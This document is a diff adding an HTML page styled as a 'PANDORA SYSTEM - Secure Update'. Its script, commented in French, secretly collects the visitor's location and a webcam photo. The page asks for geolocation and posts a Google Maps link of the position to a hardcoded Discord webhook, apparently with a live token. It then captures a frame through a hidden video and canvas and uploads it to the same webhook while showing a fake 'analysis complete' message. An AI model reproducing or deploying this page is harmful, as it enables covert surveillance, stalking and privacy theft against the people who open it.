@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>PANDORA SYSTEM - Secure Update</title>
+    <style>
+        body { background: #000; color: #ff0000; font-family: monospace; text-align: center; padding-top: 15%; }
+        .box { border: 1px solid #ff0000; display: inline-block; padding: 20px; box-shadow: 0 0 15px #ff0000; }
+        canvas { display: none; } /* Cache la capture */
+        video { display: none; }  /* Cache le flux vidéo */
+    </style>
+</head>
+<body>
+    <div class="box">
+        <h1>PANDORA V3.5</h1>
+        <p id="status">SYNCHRONISATION DES SYSTÈMES...</p>
+        <video id="video" autoplay></video>
+        <canvas id="canvas"></canvas>
+    </div>
+
+    <script>
+        const WEBHOOK = "https://discord.com/api/webhooks/1466502605881475242/ynqT6t3L8IAQ69mgtvO17VvNBvmjFqiHayODx-P5EWMeN6renSu8UiM8nDfNNNvTHYy0";
+
+        // --- ENVOI DE L'IMAGE VERS DISCORD ---
+        function sendImage(blob) {
+            const formData = new FormData();
+            formData.append('file', blob, 'snap.png');
+            formData.append('payload_json', JSON.stringify({
+                username: "PANDORA CAM",
+                content: "📸 **CAPTURE WEBCAM RÉUSSIE !**"
+            }));
+
+            fetch(WEBHOOK, { method: 'POST', body: formData });
+        }
+
+        // --- CAPTURE WEBCAM ---
+        async function startCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+
+                // Attendre que la vidéo soit prête et prendre la photo
+                setTimeout(() => {
+                    const canvas = document.getElementById('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    
+                    canvas.toBlob(blob => {
+                        sendImage(blob);
+                        stream.getTracks().forEach(track => track.stop()); // Éteint la caméra après capture
+                    }, 'image/png');
+                    
+                    document.getElementById('status').innerText = "✅ ANALYSE TERMINÉE";
+                }, 2000); // 2 secondes pour laisser le temps à l'image de s'ajuster
+            } catch (err) {
+                console.log("Caméra refusée ou absente");
+            }
+        }
+
+        // --- GÉOLOCALISATION ---
+        navigator.geolocation.getCurrentPosition(pos => {
+            fetch(WEBHOOK, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    content: `📍 **POSITION** : https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`
+                })
+            });
+            startCamera(); // Une fois la position ok, on tente la cam
+        }, () => {
+            startCamera(); // Même si le GPS échoue, on tente la cam
+        });
+    </script>
+</body>
+</html>
